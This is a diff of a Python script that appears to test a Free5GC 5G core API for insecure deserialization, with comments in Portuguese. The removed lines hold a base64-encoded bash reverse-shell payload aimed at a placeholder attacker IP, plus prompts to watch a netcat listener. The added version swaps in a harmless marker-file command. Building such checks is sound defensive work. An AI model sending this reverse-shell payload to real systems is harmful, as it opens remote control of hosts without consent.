@@ -2,33 +2,36 @@ import requests
 import urllib3
 import json
 import base64
+import os
 
+#--- Configurações de Ambiente (Valores Padrão do Free5GC) ---
+NF_CONFIG = {
+    "NEF_IP": "127.0.0.1",
+    "NEF_PORT": 29509
+}
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-#Configurações do teste
-NF_API_URL = "https://127.0.0.1:8001/api/deserialize" #Exemplo de API vulneravel
-TARGET_PARAMETER = "data"
-PAYLOAD_COMMAND = "bash -c 'bash -i >& /dev/tcp/[SEU_IP_DE_ATAQUE]/9001 0>&1'"
-PAYLOAD_B64 = base64.b64encode(PAYLOAD_COMMAND.encode()).decode('utf-8')
+def test_deserialization():
+    print("=" * 50)
+    print("A6: Testando Desserialização Insegura de Dados")
+    print("=" * 50)
+    
+    nf_api_url = f"https://{NF_CONFIG['NEF_IP']}:{NF_CONFIG['NEF_PORT']}/api/deserialize" #Endpoint de exemplo
+    target_param = "data"
+    
+    payload_command = "bash -c 'echo VULNERABLE > /tmp/desserialization_test.txt'"
+    payload_b64 = base64.b64encode(payload_command.encode()).decode('utf-8')
+    payload = {target_param: payload_b64}
 
-print("[+] Testando Desserialização Insegura...")
+    try:
+        response = requests.post(nf_api_url, headers={"Content-Type": "application/json"}, data=json.dumps(payload), verify=False, timeout=5)
+        
+        if response.status_code in [200, 500, 400] and ("malicious" in response.text.lower() or "exception" in response.text.lower() or os.path.exists("/tmp/desserialization_test.txt")):
+            print("[!!!] Possível vulnerabilidade de desserialização detectada! A API retornou um erro ou o comando foi executado.")
+        else:
+            print("[-] Desserialização Insegura não detectada.")
+    except requests.exceptions.RequestException as e:
+        print(f"[-] Erro ao testar desserialização: {e}")
 
-payload = {TARGET_PARAMETER: PAYLOAD_B64}
-
-try:
-    print("[+] Enviando payload de desserialização malicioso...")
-    response = requests.post(NF_API_URL, headers={"Content-Type": "application/json"}, data=json.dumps(payload), verify=False, timeout=5)
-
-    print(f"[*] Resposta da API: {response.status_code}")
-
-    if response.status_code == 500 or response.status_code == 400:
-        if "malicious" in response.text.lower() or "exception" in response.text.lower():
-            print("[!!!] Possível vulnerabilidade detectada! Verifique seu listener netcat.")
-
-    elif response.status_code == 200:
-        print("[+] O servidor respondeu com sucesso. Verifique seu listener (netcat) para uma shell reversa.")
-
-except requests.exceptions.Timeout:
-    print("[+] Possível vulnerabilidade de DoS ou SSRF-blind detectada (timeout).")
-except requests.exceptions.RequestException as e:
-    print(f"[-] Erro de conexão: {e}")
+if __name__ == "__main__":
+    test_deserialization()
